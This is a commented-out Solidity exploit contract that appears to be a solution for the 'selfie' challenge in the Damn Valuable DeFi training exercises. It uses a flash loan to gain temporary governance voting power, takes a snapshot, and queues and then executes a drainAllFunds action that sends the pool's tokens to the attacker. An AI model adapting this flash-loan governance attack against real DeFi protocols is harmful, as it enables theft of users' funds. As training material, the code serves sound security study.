// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// import "../DamnValuableTokenSnapshot.sol";
// import "../selfie/SelfiePool.sol";
// import "../selfie/SimpleGovernance.sol";

// contract AttackSelfie {
//     DamnValuableTokenSnapshot public token;
//     SelfiePool public pool;
//     SimpleGovernance public governance;

//     uint256 public actionId;

//     constructor(address _token, address _pool, address _governance) {
//         token = DamnValuableTokenSnapshot(_token);
//         pool = SelfiePool(_pool);
//         governance = SimpleGovernance(_governance);
//     }

//     fallback() external {
//         token.snapshot();
//         token.transfer(address(pool), token.balanceOf(address(this)));
//     }

//     function attack() external {
//         pool.flashLoan(token.balanceOf(address(pool)));
//         // This will run after the snapshot
//         actionId = governance.queueAction(
//             address(pool),
//             abi.encodeWithSignature(
//                 "drainAllFunds(address)",
//                 address(msg.sender)
//             ),
//             0
//         );
//     }

//     function attack2() external {
//         governance.executeAction(actionId);
//     }
// }
